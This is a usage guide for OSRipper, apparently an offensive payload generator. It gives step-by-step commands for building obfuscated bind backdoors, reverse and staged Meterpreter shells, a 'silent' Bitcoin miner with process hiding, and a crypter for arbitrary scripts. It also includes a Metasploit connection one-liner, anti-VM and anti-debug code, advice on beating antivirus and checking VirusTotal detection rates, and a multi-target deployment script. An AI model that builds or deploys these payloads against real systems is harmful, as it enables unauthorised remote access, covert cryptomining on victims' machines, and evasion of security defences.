# OSRipper Usage Guide

This comprehensive guide covers all aspects of using OSRipper v0.3.1 for payload generation and red team operations.

## Table of Contents

- [Quick Start](#quick-start)
- [Interactive Mode](#interactive-mode)
- [Command Line Interface](#command-line-interface)
- [Configuration](#configuration)
- [Payload Types](#payload-types)
- [Advanced Features](#advanced-features)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)

## Quick Start

### Basic Usage

1. **Interactive Mode (Recommended for beginners)**
   ```bash
   sudo python3 main.py
   ```

2. **Command Line Mode (Advanced users)**
   ```bash
   python3 cli.py reverse -h 192.168.1.100 -p 4444 --obfuscate --compile
   ```

### First Time Setup

1. Install dependencies:
   ```bash
   pip3 install -r requirements.txt
   ```

2. Run setup script:
   ```bash
   sudo python3 setup.py
   ```

3. Create configuration file:
   ```bash
   python3 config.py --create-sample
   ```

## Interactive Mode

The interactive mode provides a user-friendly menu system for payload generation.

### Menu Options

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           🏴‍☠️ OSRipper v0.3.1 Menu 🏴‍☠️                           │
├─────────────────────────────────────────────────────────────────────────────┤
│  1. 🔗 Create Bind Backdoor                                                 │
│  2. 🔐 Create Encrypted TCP Meterpreter (RECOMMENDED)                      │
│  3. 🎭 Crypt Custom Code                                                    │
│  4. ⛏️  Create Silent BTC Miner                                             │
│  5. 🌐 Create Encrypted Meterpreter (Staged)                               │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Step-by-Step Examples

#### Option 1: Bind Backdoor
1. Select option `1`
2. Enter port number (e.g., `4444`)
3. Choose obfuscation (recommended: `y`)
4. Choose compilation (optional: `y`)
5. Binary saved in `dist/` folder

#### Option 2: Reverse Meterpreter
1. Select option `2`
2. Choose ngrok or manual IP
3. Enter IP and port
4. Configure post-generation options
5. Metasploit listener starts automatically

## Command Line Interface

The CLI provides powerful automation capabilities for advanced users.

### Basic Syntax

```bash
python3 cli.py <command> [options]
```

### Available Commands

#### Bind Backdoor
```bash
python3 cli.py bind -p 4444
python3 cli.py bind -p 4444 --obfuscate --compile --icon app.ico
```

#### Reverse Shell
```bash
python3 cli.py reverse -h 192.168.1.100 -p 4444
python3 cli.py reverse --ngrok -p 4444 --obfuscate
```

#### BTC Miner
```bash
python3 cli.py miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
```

#### Custom Script Encryption
```bash
python3 cli.py custom --script malware.py --obfuscate
```

#### Staged Payload
```bash
python3 cli.py staged -h 192.168.1.100 -p 8080 --compile
```

### Global Options

| Option | Description | Example |
|--------|-------------|---------|
| `--output` | Output filename | `--output backdoor` |
| `--obfuscate` | Enable obfuscation | `--obfuscate` |
| `--compile` | Compile to binary | `--compile` |
| `--icon` | Custom icon file | `--icon app.ico` |
| `--quiet` | Minimal output | `--quiet` |
| `--config` | Configuration file | `--config custom.yml` |

## Configuration

OSRipper supports YAML and JSON configuration files for customizing behavior.

### Creating Configuration

```bash
python3 config.py --create-sample
```

This creates `osripper.yml` with default settings.

### Configuration Structure

```yaml
general:
  output_dir: "dist"
  log_level: "INFO"
  auto_cleanup: true

payload:
  default_name: "payload"
  auto_obfuscate: true
  obfuscation_layers: 5
  anti_debug: true
  anti_vm: true

network:
  default_port_range: [4444, 8888]
  use_ssl: true
  connection_timeout: 30

compilation:
  auto_compile: false
  compiler: "nuitka"
  optimization_level: 2

evasion:
  sandbox_detection: true
  vm_detection: true
  debugger_detection: true
  sleep_before_execution: 0

ngrok:
  auto_setup: false
  region: "us"
  auth_token: "your_token_here"
```

### Using Configuration

```bash
python3 cli.py reverse -h 192.168.1.100 -p 4444 --config custom.yml
```

## Payload Types

### 1. Bind Backdoor

**Description**: Opens a port on the target machine and waits for connections.

**Use Cases**:
- Direct access to compromised systems
- Situations where reverse connections are blocked
- Testing internal network security

**Example**:
```bash
python3 cli.py bind -p 4444 --obfuscate
```

**Connection**:
```bash
# Using Metasploit
msfconsole -q -x 'use python/meterpreter/bind_tcp; set RHOST target_ip; set RPORT 4444; exploit'
```

### 2. Reverse TCP Meterpreter

**Description**: Connects back to your machine with encrypted communication.

**Use Cases**:
- Bypassing firewalls
- Red team exercises
- Penetration testing

**Features**:
- SSL/TLS encryption
- Anti-debugging techniques
- VM detection
- Automatic reconnection

**Example**:
```bash
python3 cli.py reverse -h 192.168.1.100 -p 4444 --obfuscate --compile
```

### 3. Silent BTC Miner

**Description**: Cryptocurrency miner with stealth capabilities.

**Features**:
- Low CPU usage profiles
- Pool mining support
- Error handling and reconnection
- Process hiding techniques

**Example**:
```bash
python3 cli.py miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
```

### 4. Custom Script Crypter

**Description**: Encrypts and obfuscates existing Python scripts.

**Use Cases**:
- Protecting proprietary code
- Evading signature-based detection
- Code distribution

**Example**:
```bash
python3 cli.py custom --script my_tool.py --obfuscate
```

### 5. Staged Payload

**Description**: Multi-stage payload delivery via web server.

**Features**:
- Smaller initial payload
- Dynamic loading
- Web-based delivery
- Enhanced stealth

**Example**:
```bash
python3 cli.py staged -h 192.168.1.100 -p 8080
```

## Advanced Features

### Obfuscation Techniques

OSRipper uses advanced multi-layer obfuscation:

1. **String Fragmentation**: Splits strings into random chunks
2. **Variable Randomization**: Generates unique variable names
3. **Junk Code Injection**: Adds non-functional code
4. **Anti-Debugging**: Detects debugging environments
5. **VM Detection**: Identifies virtual machines
6. **Multi-Layer Encoding**: Base64, Zlib, Marshal encoding

### Evasion Features

#### Anti-VM Detection
```python
# Automatically added to payloads
vm_indicators = ['vmware', 'virtualbox', 'qemu']
if any(indicator in platform.platform().lower() for indicator in vm_indicators):
    os._exit(0)
```

#### Anti-Debug Protection
```python
# Timing-based detection
start = time.time()
time.sleep(0.01)
if time.time() - start > 0.1:
    os._exit(1)
```

#### Sandbox Evasion
- Process enumeration checks
- Hardware fingerprinting
- Behavioral analysis resistance

### Compilation Options

#### Nuitka (Recommended)
```bash
python3 cli.py reverse -h 192.168.1.100 -p 4444 --compile
```

**Advantages**:
- Better performance
- Smaller file size
- Native compilation
- Cross-platform support

#### PyInstaller
```bash
# Configure in osripper.yml
compilation:
  compiler: "pyinstaller"
```

### Ngrok Integration

Automatic tunnel creation for easy remote access:

```bash
python3 cli.py reverse --ngrok -p 4444
```

**Setup**:
1. Get API key from https://dashboard.ngrok.com/api
2. Configure in `osripper.yml`:
   ```yaml
   ngrok:
     auth_token: "your_token_here"
     region: "us"
   ```

## Best Practices

### Security Considerations

1. **Always use obfuscation** for production payloads
2. **Test in isolated environments** first
3. **Use SSL encryption** for network communications
4. **Implement proper cleanup** after operations
5. **Follow responsible disclosure** guidelines

### Performance Optimization

1. **Choose appropriate obfuscation layers**:
   - Light: 3-4 layers
   - Medium: 5-7 layers
   - Heavy: 8+ layers

2. **Optimize compilation settings**:
   ```yaml
   compilation:
     optimization_level: 2
     strip_debug: true
   ```

3. **Configure resource limits**:
   ```yaml
   miner:
     cpu_usage_limit: 50
     threads: 2
   ```

### Operational Security

1. **Use VPNs** for callback connections
2. **Rotate infrastructure** regularly
3. **Monitor detection rates** on VirusTotal
4. **Keep payloads updated** with latest evasion techniques

## Troubleshooting

### Common Issues

#### 1. Compilation Fails
```bash
❌ Compilation failed
Error: No module named 'nuitka'
```

**Solution**:
```bash
pip3 install nuitka
# or
pip3 install -r requirements.txt
```

#### 2. Ngrok Connection Issues
```bash
❌ Ngrok setup failed
```

**Solutions**:
- Check API token configuration
- Verify ngrok is installed: `ngrok version`
- Check internet connectivity
- Try different region in config

#### 3. Metasploit Listener Not Starting
```bash
❌ Failed to start listener
```

**Solutions**:
- Verify Metasploit installation
- Check port availability: `netstat -ln | grep 4444`
- Run with proper privileges: `sudo`

#### 4. Payload Detection
```bash
Payload detected by antivirus
```

**Solutions**:
- Increase obfuscation layers
- Use different evasion techniques
- Test with different compilers
- Add custom anti-detection code

### Debug Mode

Enable verbose logging for troubleshooting:

```bash
python3 cli.py reverse -h 192.168.1.100 -p 4444 --config debug.yml
```

**debug.yml**:
```yaml
general:
  log_level: "DEBUG"
```

### Log Analysis

Check logs for detailed error information:

```bash
# Main log
tail -f logs/osripper.log

# Error log
tail -f logs/error.log

# JSON structured log
jq . logs/osripper.json
```

### Getting Help

1. **Check documentation**: `docs/` directory
2. **Review logs**: `logs/` directory
3. **Open issues**: GitHub repository
4. **Community support**: Discord/Forums

### Performance Monitoring

Monitor payload performance:

```bash
# Log statistics
python3 logger.py

# System resources
htop
iotop
```

## Advanced Usage Examples

### Multi-Target Deployment

```bash
#!/bin/bash
# Deploy to multiple targets

targets=("192.168.1.10" "192.168.1.20" "192.168.1.30")
port=4444

for target in "${targets[@]}"; do
    echo "Generating payload for $target"
    python3 cli.py reverse -h $target -p $port --output "payload_$target" --obfuscate --compile --quiet
done
```

### Automated Testing Pipeline

```bash
#!/bin/bash
# Automated payload testing

# Generate payload
python3 cli.py reverse -h 192.168.1.100 -p 4444 --output test_payload --obfuscate

# Test compilation
python3 cli.py reverse -h 192.168.1.100 -p 4444 --output test_payload --compile

# Verify output
if [ -f "dist/test_payload" ]; then
    echo "✅ Payload generated successfully"
else
    echo "❌ Payload generation failed"
    exit 1
fi
```

### Custom Configuration Templates

Create specialized configurations for different scenarios:

**stealth.yml** (Maximum evasion):
```yaml
payload:
  obfuscation_layers: 10
  anti_debug: true
  anti_vm: true
  junk_code: true

evasion:
  sleep_before_execution: 30
  sandbox_detection: true
  analysis_detection: true
```

**performance.yml** (Optimized for speed):
```yaml
payload:
  obfuscation_layers: 3
  anti_debug: false
  anti_vm: false

compilation:
  optimization_level: 3
  strip_debug: true
```

This completes the comprehensive usage guide for OSRipper v0.3.1. For additional help, consult the API documentation and example scripts in the `examples/` directory.
